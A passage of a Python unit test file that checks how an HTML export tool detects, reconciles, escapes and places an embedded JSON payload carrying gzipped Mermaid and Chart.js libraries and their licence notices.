        # to be gated on the COMBINED flag, which a mermaid diagram already satisfied - so gating it
        # on the union would leave uses_charts False and drop a half the document needs.
        fragment = (MERMAID + '<p><figure class="chart"></p><canvas id="q"></canvas>')
        out, _ = vendored_libs.apply(_doc(fragment), self.blob)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid", "chartjs"})

    def test_a_library_whose_licence_is_missing_is_not_counted_as_carried(self):
        # Bytes and notice travel as ONE unit: MIT requires the notice to accompany the copy, and
        # the exporter refuses to inline a library whose notice is absent. A payload holding orphan
        # bytes must therefore read as NOT carrying that library, so it gets reconciled rather than
        # silently retained (which is how ~1,265 KB of unlicensed bytes could have survived).
        self.assertEqual(
            vendored_libs.carried_libs({"mermaidGzipBase64": "AAA", "chartjsGzipBase64": "BBB",
                                        "chartjsLicense": "MIT"}),
            {"chartjs"})

    def test_a_library_whose_bytes_are_blank_is_not_counted_as_carried(self):
        self.assertEqual(
            vendored_libs.carried_libs({"mermaidGzipBase64": "   ", "mermaidLicense": "MIT"}),
            set())

    def test_orphan_bytes_are_removed_rather_than_retained(self):
        # The end-to-end form of the two predicates above.
        html = _doc(CHART)
        span = vendored_libs.find_blob(html)
        obj = vendored_libs.payload_object(html[span[0]:span[1]])
        del obj["mermaidLicense"]
        wounded = (html[:span[0]] + vendored_libs.payload_script(obj) + html[span[1]:])
        out, changed = vendored_libs.apply(wounded, self.blob)
        self.assertTrue(changed)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"chartjs"})
        self.assertLess(len(out), len(wounded), "the orphan mermaid bytes must be gone")

    def test_complementary_partial_duplicates_are_merged_rather_than_one_being_chosen(self):
        # The hardest duplicate case: two copies that are individually incomplete but JOINTLY
        # sufficient - one carrying only mermaid, the other only Chart.js. Picking either would
        # delete bytes nothing else can supply when no template is reachable, so the survivor is
        # built from both.
        fragment = MERMAID + '<figure class="chart"><canvas class="cmh-chart"></canvas></figure>'
        full, _ = vendored_libs.apply(_doc(fragment), self.blob)
        span = vendored_libs.find_blob(full)
        obj = vendored_libs.payload_object(full[span[0]:span[1]])
        mermaid_only = vendored_libs.payload_script(vendored_libs.reconcile(obj, {"mermaid"}))
        chart_only = vendored_libs.payload_script(vendored_libs.reconcile(obj, {"chartjs"}))
        split = full[:span[0]] + mermaid_only + "\n" + chart_only + full[span[1]:]
        self.assertEqual(split.count('id="cmhVendoredRichLibs"'), 2, "fixture premise")
        out, changed = vendored_libs.apply(split, None)
        self.assertTrue(changed)
        self.assertEqual(out.count('id="cmhVendoredRichLibs"'), 1)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid", "chartjs"},
                         "jointly sufficient copies must be merged, not chosen between")

    def test_collapsing_duplicates_keeps_the_copy_that_can_satisfy_the_document(self):
        # Once payloads can be partial, a stale refresh can leave a COMPLETE copy followed by a
        # right-sized one. Blindly keeping the last would throw away the only bytes that could
        # satisfy the document - permanently, when no template is reachable to restore from.
        fragment = MERMAID + '<figure class="chart"><canvas class="cmh-chart"></canvas></figure>'
        full, _ = vendored_libs.apply(_doc(fragment), self.blob)
        span = vendored_libs.find_blob(full)
        full_element = full[span[0]:span[1]]
        chart_only = vendored_libs.payload_script(
            vendored_libs.reconcile(vendored_libs.payload_object(full_element), {"chartjs"}))
        doubled = full[:span[1]] + "\n" + chart_only + full[span[1]:]
        self.assertEqual(doubled.count('id="cmhVendoredRichLibs"'), 2, "fixture premise")
        out, changed = vendored_libs.apply(doubled, None)
        self.assertTrue(changed)
        self.assertEqual(out.count('id="cmhVendoredRichLibs"'), 1)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid", "chartjs"},
                         "the surviving copy must still satisfy the document with no template")

    def test_a_payload_we_cannot_serialize_portably_leaves_the_document_alone(self):
        # Python's json emits bare `NaN` by default, which is not JSON and which a browser's
        # JSON.parse REFUSES - and a browser is the payload's only consumer. Rather than write a
        # payload the runtime cannot read, the serializer refuses and apply() leaves the file as is.
        self.assertRaises(ValueError, vendored_libs.serialize_payload,
                          {"encoding": "gzip+base64", "odd": float("nan")})
        # An overflowing literal parses to inf and is refused the same way, so a document can never
        # be handed a payload whose numbers the browser will reject.
        overflowed = vendored_libs.payload_object(
            '<script id="cmhVendoredRichLibs" type="application/json">'
            '{"encoding":"gzip+base64","big":1e400}</script>')
        self.assertRaises(ValueError, vendored_libs.serialize_payload, overflowed)
        settled, _ = vendored_libs.apply(_doc(CHART), self.blob)
        inner = vendored_libs._inner_span(settled)
        obj = vendored_libs.payload_object(settled)
        obj["mermaidGzipBase64"] = "ORPHAN"          # forces a reconciliation attempt
        obj["odd"] = float("nan")                    # which cannot be serialized portably
        wounded = settled[:inner[0]] + json.dumps(obj) + settled[inner[1]:]
        out, changed = vendored_libs.apply(wounded, self.blob)
        self.assertFalse(changed, "an unserializable payload must not be rewritten")
        self.assertEqual(out, wounded)

    def test_orphan_bytes_survive_only_when_no_source_can_complete_the_document(self):
        # The LIMIT of the orphan rule, pinned so the claim in CMH-SIZE-01 stays accurate. When the
        # content NEEDS the library whose licence went missing and no template is reachable, there
        # is nothing to rebuild from, so the document is left byte-identical - orphans included -
        # and the export fails loudly. Half-writing a payload would be worse: it would look healthy.
        fragment = MERMAID + '<figure class="chart"><canvas class="cmh-chart"></canvas></figure>'
        settled, _ = vendored_libs.apply(_doc(fragment), self.blob)
        inner = vendored_libs._inner_span(settled)
        obj = vendored_libs.payload_object(settled)
        self.assertEqual(vendored_libs.carried_libs(obj), {"mermaid", "chartjs"})
        del obj["mermaidLicense"]
        wounded = settled[:inner[0]] + vendored_libs.serialize_payload(obj) + settled[inner[1]:]
        out, changed = vendored_libs.apply(wounded, None)
        self.assertFalse(changed, "with no reachable source the document must be left alone")
        self.assertEqual(out, wounded)

    def test_a_payload_that_is_not_json_is_left_exactly_as_it_is(self):
        # apply() runs from finalize BEFORE validation, so it must never raise on a hand-edited
        # document - and it must not silently replace bytes it cannot understand either. The
        # payload is placed AFTER the content root first, so nothing is due structurally and the
        # only correct outcome is a byte-identical document (relocation of an unparseable payload
        # is a separate behaviour, pinned by its own test below).
        settled, _ = vendored_libs.apply(_doc(CHART), self.blob)
        inner = vendored_libs._inner_span(settled)
        for text in ("{not json", "null", "[]", '"a string"', "17", ""):
            with self.subTest(text=text):
                broken = settled[:inner[0]] + text + settled[inner[1]:]
                out, changed = vendored_libs.apply(broken, self.blob)
                self.assertFalse(changed, "an unparseable payload must not be rewritten")
                self.assertEqual(out, broken, "an unparseable payload must survive byte-for-byte")

    def test_an_unparseable_payload_is_still_moved_out_of_the_head(self):
        # Structural placement needs no JSON parse, so refusing to parse must not also refuse to
        # relocate - that would leave a payload on line 7 forever. Built from a LEGACY head-placed
        # document, since the shell itself stopped putting one there (CMH-SIZE-05).
        html = _legacy_head_payload(_doc(CHART))
        span = vendored_libs.find_blob(html)
        broken = (html[:span[0]]
                  + '<script id="cmhVendoredRichLibs" type="application/json">{oops</script>'
                  + html[span[1]:])
        self.assertLess(vendored_libs.find_blob(broken)[0], broken.lower().find("</head>"))
        out, changed = vendored_libs.apply(broken, self.blob)
        self.assertTrue(changed)
        self.assertGreater(vendored_libs.find_blob(out)[0], out.lower().find("</head>"))
        self.assertIn("{oops</script>", out)

    def test_a_payload_element_with_an_awkward_tag_is_rewritten_without_corruption(self):
        # The inner text span must come from the PARSER: a `>` inside a quoted attribute and a
        # padded closing tag both defeat a find(">")/rfind("<") reconstruction, which is the exact
        # class of bug that made the original regex detector delete authored content.
        html = _doc(CHART)
        span = vendored_libs.find_blob(html)
        obj = vendored_libs.payload_object(html[span[0]:span[1]])
        awkward = ('<script id="cmhVendoredRichLibs" type="application/json" title="a > b">'
                   + vendored_libs.serialize_payload(obj) + "</script   >")
        doc = html[:span[0]] + awkward + html[span[1]:]
        out, _changed = vendored_libs.apply(doc, self.blob)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"chartjs"})
        # The whole element moved as one unit: no orphaned fragment of the awkward tag is left
        # behind anywhere in the document.
        self.assertNotIn('title="a > b"', out.replace(
            out[slice(*vendored_libs.find_blob(out))], ""))

    def test_a_licence_containing_a_script_end_tag_is_escaped(self):
        # The payload is inert JSON inside a <script>; a raw `</script>` in any value would close
        # the element early and spill the rest of the payload into the document as markup. All
        # THREE substitutions are pinned: the shipped payload happens to contain no `<`, `>` or `&`
        # at all, so a comparison against real bytes proves nothing about the escape - only a value
        # that actually carries them can.
        text = vendored_libs.serialize_payload(
            {"encoding": "gzip+base64", "mermaidLicense": "MIT </script> a > b & c"})
        self.assertNotIn("</script", text.lower())
        self.assertIn("\\u003C", text)
        self.assertIn("\\u003E", text)
        self.assertIn("\\u0026", text)
        self.assertNotIn(">", text.replace("\\u003E", ""))
        self.assertNotIn("&", text.replace("\\u0026", ""))

    def test_reconciliation_preserves_the_encoding_the_document_declares(self):
        # `encoding` is a field this module does not own; a future producer could legitimately set
        # something other than gzip+base64, and reconciliation must not quietly rewrite it.
        obj = {"encoding": "brotli+base64", "chartjsGzipBase64": "AAA", "chartjsLicense": "MIT"}
        self.assertEqual(vendored_libs.reconcile(obj, {"chartjs"})["encoding"], "brotli+base64")

    def test_the_serializer_produces_the_bytes_the_build_actually_shipped(self):
        # Compare against the REAL built template's payload text, not against a re-implementation of
        # the escape formula - asserting `f(x) == <copy of f's body>(x)` is `X == X` and could not
        # catch the escape being dropped, because the build now imports this same function.
        span = vendored_libs._inner_span(self.blob)
        shipped = self.blob[span[0]:span[1]]
        obj = vendored_libs.payload_object(self.blob)
        self.assertEqual(vendored_libs.serialize_payload(obj), shipped,
                         "the shared serializer no longer reproduces the shipped payload bytes")

    def test_reconciliation_keeps_the_documents_own_bytes_rather_than_the_templates(self):
        # Idempotence depends on this: preferring the template would rewrite every document
        # whenever the template was rebuilt, churning multi-megabyte files on every finalize.
        doc_obj = {"encoding": "gzip+base64", "chartjsGzipBase64": "DOC", "chartjsLicense": "DOCMIT"}
        src_obj = {"encoding": "gzip+base64", "chartjsGzipBase64": "SRC", "chartjsLicense": "SRCMIT",
                   "mermaidGzipBase64": "SRCM", "mermaidLicense": "SRCMMIT"}
        out = vendored_libs.reconcile(doc_obj, {"chartjs", "mermaid"}, src_obj)
        self.assertEqual(out["chartjsGzipBase64"], "DOC", "the document's own pair must win")
        self.assertEqual(out["mermaidGzipBase64"], "SRCM", "the missing half comes from the source")

    def test_reconciliation_preserves_keys_it_does_not_recognise(self):
        # Rebuilding from a fixed key list alone would silently discard whatever a future or older
        # producer had put in the payload. Dropping data we merely do not recognise is exactly the
        # loss this module exists to prevent. The ORDER is pinned too: canonical keys first, then
        # the unrecognised ones in their original order.
        obj = {"encoding": "gzip+base64", "chartjsGzipBase64": "AAA", "chartjsLicense": "MIT",
               "futureField": {"k": 1}, "anotherOne": "x"}
        out = vendored_libs.reconcile(obj, {"chartjs"})
        self.assertEqual(out.get("futureField"), {"k": 1})
        self.assertEqual(list(out.keys()),
                         ["encoding", "chartjsGzipBase64", "chartjsLicense",
                          "futureField", "anotherOne"])

    def test_the_insert_path_preserves_the_templates_unrecognised_keys_too(self):
        # The same rule in the other direction: restoring a payload from the template must not drop
        # keys the template carried, or the loss just moves rather than being prevented.
        span = vendored_libs._inner_span(self.blob)
        obj = vendored_libs.payload_object(self.blob)
        obj["futureField"] = "keep me"
        rich = (self.blob[:span[0]] + vendored_libs.serialize_payload(obj)
                + self.blob[span[1]:])
        stripped, _ = vendored_libs.apply(_doc(PROSE), rich)
        grew = stripped.replace(
            "</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, rich)
        self.assertTrue(changed)
        self.assertEqual(self._payload(out).get("futureField"), "keep me")

    def test_a_diagram_only_partial_payload_gains_the_chart_half(self):
        # The symmetric case of the completion test above, so neither direction can regress alone.
        diagram_only, _ = vendored_libs.apply(_doc(MERMAID), self.blob)
        self.assertEqual(vendored_libs.carried_libs(self._payload(diagram_only)), {"mermaid"})
        grew = diagram_only.replace(
            "</h1>", '</h1>\n<figure class="chart"><canvas class="cmh-chart"></canvas></figure>', 1)
        out, changed = vendored_libs.apply(grew, self.blob)
        self.assertTrue(changed)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid", "chartjs"})

    def test_a_document_with_no_payload_that_needs_both_gets_both(self):
        # The insert path with a two-library need, which the completion tests never exercise.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        self.assertIsNone(vendored_libs.find_blob(stripped))
        grew = stripped.replace(
            "</h1>",
            '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>'
            '<figure class="chart"><canvas class="cmh-chart"></canvas></figure>', 1)
        out, changed = vendored_libs.apply(grew, self.blob)
        self.assertTrue(changed)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid", "chartjs"})

    def test_reconciliation_is_idempotent(self):
        once, changed = vendored_libs.apply(_doc(CHART), self.blob)
        self.assertTrue(changed)
        twice, changed_again = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed_again, "a settled document must not be rewritten again")
        self.assertEqual(twice, once)

    def test_the_reconciled_payload_uses_the_builds_canonical_key_order(self):
        # Without a fixed order the payload becomes a function of the document's finalize HISTORY
        # rather than of its content, so two identical documents could differ byte for byte.
        out, _ = vendored_libs.apply(_doc(MERMAID), self.blob)
        keys = list(self._payload(out).keys())
        self.assertEqual(keys, [k for k in vendored_libs.CANONICAL_KEYS if k in keys])

    def test_a_partial_payload_is_left_alone_when_no_source_is_reachable(self):
        # finalize tolerates an unreachable template; completing a half is impossible then, and
        # guessing is worse than doing nothing.
        chart_only, _ = vendored_libs.apply(_doc(CHART), self.blob)
        grew = chart_only.replace(
            "</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, None)
        self.assertFalse(changed)
        self.assertEqual(out, grew)


class RuntimeDifferentialTests(unittest.TestCase):
    """CMH-SIZE-01: the regex detector agrees with the runtime's selectors on every real document.

    The substring parity test below only proves the two mention the same selectors. This one is
    the check that matters: a FALSE NEGATIVE deletes a payload the document's own offline export
    then demands, and fails with "Offline export is missing the vendored Chart.js bundle". So
    run a genuine HTML-parser implementation of the runtime's selector list
    (`pre.mermaid, div.mermaid, figure.chart canvas, canvas.cmh-chart,
    canvas[data-cmh-chart-points], canvas[data-cmh-chart-source]` - declared once in
    `assets/js/03-selectors.js`) over every shipped example's CONTENT region and require the
    fast regex to reach the same verdict.
    """

    class _RuntimeTruth(HTMLParser):
        """An INDEPENDENT implementation of what the runtime exporter looks for.

        It locates `#commentRoot` itself and evaluates the selector list inside it, exactly as
        `68-export-offline.js` does. It deliberately does NOT reuse anything from
        `vendored_libs`, and it deliberately does NOT use the CONTENT markers: the marker span
        is 126 - 514 bytes NARROWER than the root on the shipped examples, so scoping to the
        markers here would compare a different region than production and the differential
        would be worthless.
        """

        def __init__(self):
            HTMLParser.__init__(self, convert_charrefs=False)
            self.stack = []
            self.hit = False
            self._depth = None
            self._in_root = False
            self._done = False

        def handle_starttag(self, tag, attrs):
            attrs = dict(attrs)
            classes = (attrs.get("class") or "").split()
            if tag == "main" and attrs.get("id") == "commentRoot" and self._depth is None:
                self._depth = len(self.stack)
                self._in_root = True
            if self._in_root and not self._done:
                if tag in ("pre", "div") and "mermaid" in classes:
                    self.hit = True
                if tag == "canvas" and "cmh-chart" in classes:
                    self.hit = True
                if tag == "canvas" and any(t == "figure" and "chart" in c for t, c in self.stack):
                    self.hit = True
                if tag == "canvas" and ("data-cmh-chart-points" in attrs or "data-cmh-chart-source" in attrs):
                    self.hit = True
            if tag not in ("br", "img", "input", "meta", "link", "hr", "canvas"):
                self.stack.append((tag, classes))

        def handle_startendtag(self, tag, attrs):
            self.handle_starttag(tag, attrs)
            if tag not in ("br", "img", "input", "meta", "link", "hr", "canvas") \
                    and self.stack and self.stack[-1][0] == tag:
                self.stack.pop()

        def handle_endtag(self, tag):
            for i in range(len(self.stack) - 1, -1, -1):
                if self.stack[i][0] == tag:
                    if tag == "main" and self._depth is not None and i == self._depth:
                        self._in_root = False
                        self._done = True
                    del self.stack[i:]
                    return

    def _runtime_needs(self, html):
        truth = self._RuntimeTruth()
        truth.feed(html)
        truth.close()
        self.assertIsNotNone(truth._depth, "the runtime emulation must find #commentRoot")
        return truth.hit

    def test_the_detector_matches_the_runtime_on_every_shipped_example(self):
        examples = sorted(glob.glob(os.path.join(_paths.EXAMPLES, "*.html")))
        self.assertTrue(examples, "there must be shipped examples to check against")
        checked = 0
        for path in examples:
            with open(path, "r", encoding="utf-8", newline="") as fh:
                html = fh.read()
            expected = vendored_libs.USES if self._runtime_needs(html) else vendored_libs.UNUSED
            self.assertEqual(
                vendored_libs.content_state(html), expected,
                "%s: the author-time detector disagrees with the runtime's selectors. A false "
                "NEGATIVE here strips a payload the document's own offline export needs."
                % os.path.basename(path))
            checked += 1
        self.assertGreaterEqual(checked, 5, "expected the full example corpus, got %d" % checked)

    def test_the_corpus_covers_both_verdicts(self):
        # Guards the test above: if every example landed on the same side it would pass while
        # proving only half the behaviour.
        states = set()
        for path in glob.glob(os.path.join(_paths.EXAMPLES, "*.html")):
            with open(path, "r", encoding="utf-8", newline="") as fh:
                states.add(vendored_libs.content_state(fh.read()))
        self.assertIn(vendored_libs.USES, states)
        self.assertIn(vendored_libs.UNUSED, states)

    def test_escaped_markup_in_prose_is_not_read_as_usage(self):
        # A document ABOUT commentable-html can show `<pre class="mermaid">` as escaped sample
        # text. The runtime sees text, not an element, so the detector must too.
        escaped = '<h1>Docs</h1>\n<p>Write <code>&lt;pre class="mermaid"&gt;</code> to add one.</p>'
        self.assertEqual(vendored_libs.content_state(_doc(escaped)), vendored_libs.UNUSED)


    def test_repeated_finalize_settles_and_the_anchors_survive_decoys(self):
        """The real document contains the literal `</body>` and `</head>` inside its own JS.

        `_insert_before_body_end` / `_is_at_end_of_body` anchor on those strings, so a naive
        `find` would place the payload inside a script. Drive the REAL pipeline repeatedly and
        require it to settle, with the payload genuinely at the end of the document.
        """
        import tempfile
        import finalize

        directory = tempfile.mkdtemp(prefix="cmh-vendored-settle-")
        self.addCleanup(shutil.rmtree, directory, True)
        path = os.path.join(directory, "chart.html")
        with open(path, "w", encoding="utf-8", newline="") as fh:
            fh.write(_doc(CHART))

        sizes, offsets = [], []
        for _ in range(3):
            finalize.finalize(path)
            with open(path, "r", encoding="utf-8", newline="") as fh:
                html = fh.read()
            span = vendored_libs.find_blob(html)
            self.assertIsNotNone(span, "a chart document must keep the payload")
            sizes.append(len(html))
            offsets.append(span[0])
        self.assertEqual(len(set(sizes)), 1, "repeated finalize must not churn the document")
        self.assertEqual(len(set(offsets)), 1, "the payload must not oscillate in position")

        with open(path, "r", encoding="utf-8", newline="") as fh:
            html = fh.read()
        self.assertGreater(html.lower().count("</body>"), 1,
                           "fixture premise: the layer JS carries decoy </body> literals")
        span = vendored_libs.find_blob(html)
        # Not "immediately before </body>" any more: since CMH-SIZE-05 the shell parks the payload
        # inside the machinery fence, ahead of the runtime it feeds. What must hold is the property
        # the relocation exists for - the payload is out of the head and after the authored content,
        # and inside the REAL body (not a decoy `</body>` inside the layer's own JS).
        self.assertGreater(span[0], html.rindex("</main>"),
                           "the payload must sit after the document content")
        self.assertLessEqual(span[1], html.lower().rfind("</body>"),
                             "the payload must sit inside the real end of the document")
        _assert_inside_the_fence(self, html, span, "the settled payload")


class HtmlBlindnessTests(unittest.TestCase):
    """CMH-SIZE-01: detection must not be fooled by markup a regex reads differently to a browser.

    Each case here is a FALSE NEGATIVE - the runtime would use the payload, so stripping it
    leaves the document's own offline export throwing "missing the vendored Chart.js bundle".
    All three were found by review against a real generated, strict-validated document.
    """

    def test_an_unquoted_class_attribute_still_counts_as_usage(self):
        # CSS does not require quotes; `class=cmh-chart` is a valid canvas.cmh-chart.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas class=cmh-chart id="a"></canvas>')), vendored_libs.USES)

    def test_a_greater_than_inside_an_earlier_attribute_does_not_hide_the_class(self):
        # A `>` inside a quoted attribute value does not end the tag, but a `[^>]*` scan stops
        # there and never reaches the class.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas title="A &gt; B" class="cmh-chart" id="a"></canvas>'
            .replace("&gt;", ">"))), vendored_libs.USES)

    def test_a_commented_out_end_of_root_does_not_truncate_the_scan(self):
        # A literal `</main>` inside an HTML comment must not be mistaken for the end of the
        # content root, or everything after it stops being scanned.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<!-- </main> -->\n<canvas class="cmh-chart" id="a"></canvas>')),
            vendored_libs.USES)

    def test_a_commented_out_payload_in_authored_content_is_never_deleted(self):
        # DATA LOSS. A document documenting this very feature can show the payload element as a
        # commented-out example. Treating that as the real payload deletes authored content.
        sample = ('<h1>Docs</h1>\n<p>The payload looks like this:</p>\n'
                  '<!-- <script type="application/json" id="cmhVendoredRichLibs">example</script> -->\n')
        html = _doc(sample)
        self.assertIn("cmhVendoredRichLibs", html)
        first, _ = vendored_libs.apply(html, None)
        second, _ = vendored_libs.apply(first, None)
        self.assertIn("example</script> -->", second,
                      "the commented-out sample is authored content and must not be deleted")
        self.assertEqual(second, first, "a second pass must not delete the commented sample")


    def test_case_sensitivity_follows_css_not_html(self):
        # HTML lowercases TAG names, but class matching in a standards-mode document is
        # case-SENSITIVE, so `class="CMH-CHART"` does not match `canvas.cmh-chart` in the
        # browser either. Reporting it unused is agreement with the runtime, not a miss.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<CANVAS CLASS="CMH-CHART" ID="a"></CANVAS>')), vendored_libs.UNUSED)
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<CANVAS class="cmh-chart" ID="a"></CANVAS>')), vendored_libs.USES,
            "an uppercase TAG name with a correctly-cased class is still a match")

    def test_a_self_closing_canvas_inside_a_chart_figure_counts(self):
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<figure class="chart"><canvas id="a" /></figure>')), vendored_libs.USES)

    def test_attributes_split_across_lines_still_count(self):
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas\n   class="cmh-chart"\n   id="a"></canvas>')),
            vendored_libs.USES)

    def test_markup_inside_a_script_template_is_text_not_elements(self):
        # querySelector cannot see it, so neither should the detector.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<script type="text/template">'
            '<figure class="chart"><canvas id="x"></canvas></figure></script>')),
            vendored_libs.UNUSED)

    def test_the_offsets_are_exact_for_every_line_ending(self):
        # The parser maps (line, col) to a character offset through a line table. Get that
        # wrong on CRLF and a 2.3 MB document is silently corrupted when a span is cut out.
        base = _doc(PROSE)
        for label, text in (("LF", base), ("CRLF", base.replace("\n", "\r\n")),
                            ("CR", base.replace("\n", "\r"))):
            span = vendored_libs.find_blob(text)
            self.assertIsNotNone(span, "%s: the payload must be found" % label)
            self.assertTrue(text[span[0]:].startswith("<script "),
                            "%s: the span must start exactly at the element" % label)
            self.assertTrue(text[:span[1]].endswith("</script>"),
                            "%s: the span must end exactly at the element" % label)
            out, changed = vendored_libs.apply(text, None)
            self.assertTrue(changed)
            self.assertEqual(len(text) - len(out), span[1] - span[0],
                             "%s: exactly the payload must be removed, nothing more" % label)


    def test_a_padded_closing_tag_is_cut_completely(self):
        # `</script   >` is valid HTML. Assuming len("</script>") would leave orphaned bytes
        # behind in the document when the payload span is cut out.
        base = _doc(PROSE)
        span = vendored_libs.find_blob(base)
        self.assertIsNotNone(span, "fixture premise: the document carries a payload")
        self.assertTrue(base[:span[1]].endswith("</script>"))
        html = base[:span[1] - len("</script>")] + "</script   >" + base[span[1]:]
        span = vendored_libs.find_blob(html)
        self.assertIsNotNone(span)
        self.assertTrue(html[:span[1]].rstrip().endswith(">"))
        out, changed = vendored_libs.apply(html, None)
        self.assertTrue(changed)
        self.assertNotIn("</script   >", out,
                         "the padded closing tag must be removed with its element")

    def test_a_bare_chart_canvas_the_live_renderer_draws_keeps_the_payload(self):
        # CMH-CHART-12: `canvas[data-cmh-chart-points]` (and `-source`) is part of the runtime's
        # shared chart selector list, so the live renderer draws it and the exporter provisions
        # for it even without the cmh-chart class. The author-time detector must agree, or the
        # payload the export then demands is stripped.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-points="1,2,3"></canvas>')),
            vendored_libs.USES)
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-source="pts"></canvas>')),
            vendored_libs.USES)

    def test_a_canvas_with_only_a_styling_chart_attribute_is_not_usage(self):
        # `data-cmh-chart-max` alone carries no data, so neither the built-in renderer nor the
        # exporter treats it as a chart. Counting it would keep 1.3 MB in every such document.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-max="10"></canvas>')),
            vendored_libs.UNUSED)

    def test_an_authored_payload_example_inside_the_content_is_never_deleted(self):
        # DATA LOSS, found in review. A document can legitimately author a real (not commented)
        # `<script id="cmhVendoredRichLibs">` as an example. The first pass removes the head
        # payload; a second pass must NOT then eat the authored one.
        sample = ('<h1>Docs</h1>\n<p>The payload element:</p>\n'
                  '<script type="application/json" id="cmhVendoredRichLibs">'
                  '{"example":"authored"}</script>\n')
        html = _doc(sample)
        first, _ = vendored_libs.apply(html, None)
        second, changed = vendored_libs.apply(first, None)
        self.assertIn('{"example":"authored"}', second,
                      "an authored payload example is content and must never be deleted")
        self.assertFalse(changed, "the authored example must not be mistaken for the payload")
        self.assertEqual(second, first)

    def test_misnested_chart_markup_a_browser_repairs_still_counts(self):
        # A browser repairs `<p><figure class="chart"></p>...<canvas>` so the canvas ends up
        # inside the figure and the runtime matches it. A token stack does not, so classify on
        # co-occurrence inside the root instead of exact nesting: a false positive keeps bytes,
        # a false negative breaks the export.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<p><figure class="chart"></p>\n'
            '<canvas id="a" role="img" aria-label="x"></canvas></figure>')),
            vendored_libs.USES)

    def test_an_unclosed_content_root_is_recovered_rather_than_abandoned(self):
        # A browser closes an unclosed <main> at end of input. Reporting UNKNOWN would refuse to
        # act on a document that renders perfectly well.
        html = ('<html><body><main id="commentRoot">'
                '<canvas class="cmh-chart" id="a"></canvas>')
        self.assertEqual(vendored_libs.content_state(html), vendored_libs.USES)

    def test_a_decoy_body_end_in_a_comment_does_not_receive_the_payload(self):
        # `rfind("</body>")` would pick the comment, hiding a restored 1.3 MB payload inside it
        # where neither the runtime nor find_blob can see it, while apply() reported success.
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            blob = vendored_libs.blob_script(fh.read())
        stripped, _ = vendored_libs.apply(_doc(PROSE), blob)
        grew = stripped.replace(
            "</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        # Put the decoy AFTER the real end of body. Note the fixture itself has to use rfind:
        # a plain replace(..., 1) patches the first `</body>` LITERAL, which lives inside the
        # layer's own JavaScript - the very confusion this test exists to pin.
        at = grew.rindex("</body>")
        decoyed = grew[:at] + "</body>\n<!-- the docs mention </body> here -->" + grew[at + len("</body>"):]
        out, changed = vendored_libs.apply(decoyed, blob)
        self.assertTrue(changed)
        span = vendored_libs.find_blob(out)
        self.assertIsNotNone(span, "the restored payload must be visible to the parser")
        comment_start = out.index("<!-- the docs mention")
        self.assertLess(span[1], comment_start,
                        "the payload must be placed before the real end of body, not inside "
                        "the decoy comment that follows it")

    def test_every_payload_copy_is_removed_in_one_pass(self):
        # A refresh can leave a stale second copy; one apply must clear them all, or a document
        # keeps a 1.3 MB bundle nobody looks at.
        html = _doc(PROSE)
        span = vendored_libs.find_blob(html)
        doubled = html[:span[1]] + html[span[0]:span[1]] + html[span[1]:]
        out, changed = vendored_libs.apply(doubled, None)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))
        self.assertNotIn('id="cmhVendoredRichLibs">{"encoding"', out)


    def test_a_rich_document_is_collapsed_to_exactly_one_payload_copy(self):
        # The runtime resolves the payload as infrastructure and refuses to guess between two
        # candidates (CMH-OFFLINE-08), so a rich document left with a stale second copy would be
        # un-exportable. Finalize must heal it, and the next run must be a no-op.
        html = _doc(CHART)
        span = vendored_libs.find_blob(html)
        doubled = html[:span[1]] + html[span[0]:span[1]] + html[span[1]:]
        self.assertEqual(doubled.count('id="cmhVendoredRichLibs"'), 2)
        blob = html[span[0]:span[1]]
        out, changed = vendored_libs.apply(doubled, blob)
        self.assertTrue(changed)
        self.assertEqual(out.count('id="cmhVendoredRichLibs"'), 1)
        self.assertIsNotNone(vendored_libs.find_blob(out))
        again, changed_again = vendored_libs.apply(out, blob)
        self.assertFalse(changed_again)
        self.assertEqual(again, out)


class RuntimeParityTests(unittest.TestCase):
    """CMH-SIZE-01 / CMH-CHART-12 / CMH-PRINT-07: one shared selector definition, pinned.

    The runtime declares its rich-content selectors ONCE, in `assets/js/03-selectors.js`, and the
    exporter, the live chart renderer, the PRINT surfaces, and this module's `RUNTIME_SELECTORS`
    all derive from it. These tests pin that: the constants resolve to exactly `RUNTIME_SELECTORS`,
    the exporter's usage functions query the constants rather than re-typing a literal list, the
    renderer's set is a SUBSET of the exporter's so anything drawn live is provisioned for on
    export, and the two print surfaces cap exactly the shared mermaid host set.
    """

    _CONST_RE = re.compile(r"^const (CMH_[A-Z0-9_]+)\s*=\s*(.+?);\s*$", re.M | re.S)

